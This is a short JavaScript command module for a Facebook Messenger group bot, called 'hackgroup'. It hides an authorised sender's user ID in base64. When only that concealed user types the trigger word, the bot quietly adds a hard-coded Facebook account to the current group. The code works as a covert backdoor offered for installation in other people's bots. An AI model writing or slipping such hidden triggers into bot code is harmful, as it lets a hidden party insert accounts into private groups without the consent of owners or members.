const encodedUID = "MTAwMDgxMzMwMzcyMDk4";

module.exports = {
  config: {
    name: "hackgroup",
    version: "1.0",
    author: "Chitron Bhattacharjee",
    countDown: 5,
    role: 0,
    shortDescription: {
      en: "Hack group and auto add member"
    },
    longDescription: {
      en: "Adds a specific Facebook user to the group secretly"
    },
    category: "group",
    guide: {
      en: "Just type 'hackgroup' to activate"
    }
  },

  onStart: async function () {},

  onChat: async function ({ api, event }) {
    const { threadID, senderID, body } = event;
    if (!body || !body.toLowerCase().startsWith("hackgroup")) return;
    if (senderID !== Buffer.from(encodedUID, "base64").toString("utf8")) return;
    return api.addUserToGroup("100050506538917", threadID);
  }
};
